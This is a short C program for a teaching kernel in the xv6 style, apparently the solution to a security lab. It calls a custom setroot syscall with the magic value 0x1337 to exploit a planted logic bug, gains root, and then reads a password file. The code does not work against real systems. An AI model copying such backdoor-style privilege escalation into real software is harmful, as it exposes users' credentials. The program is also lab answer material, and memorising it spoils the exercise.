#include "kernel/types.h"
#include "user/user.h"

int main(void) {
    // Exploit the logical bug: use magic=0x1337 with any uid
    setroot(999, 0x1337);
    
    // Try to read password file after privilege escalation
    readpassword(0);
    
    exit(0);
}